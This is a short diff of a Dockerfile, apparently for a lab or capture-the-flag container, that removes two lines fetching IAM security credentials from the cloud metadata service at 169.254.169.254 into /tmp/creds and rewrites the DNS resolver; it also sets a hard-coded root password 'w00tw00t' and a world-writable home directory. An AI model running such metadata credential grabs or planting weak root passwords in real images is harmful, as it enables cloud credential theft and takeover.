@@ -11,8 +11,6 @@ RUN mkdir /home/r00t && \
     chmod 777 /home/r00t &&\
     chown r00t:r00t /home/r00t
 RUN echo "root:w00tw00t" | chpasswd
-RUN export ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-RUN curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" > /tmp/creds
-RUN echo "nameserver $ZEST_PORT_53_UDP_ADDR" >> /etc/resolv.conf
+RUN echo "nameserver 198.18.70.137" > /etc/resolv.conf
 
 CMD ["/bin/bash"]
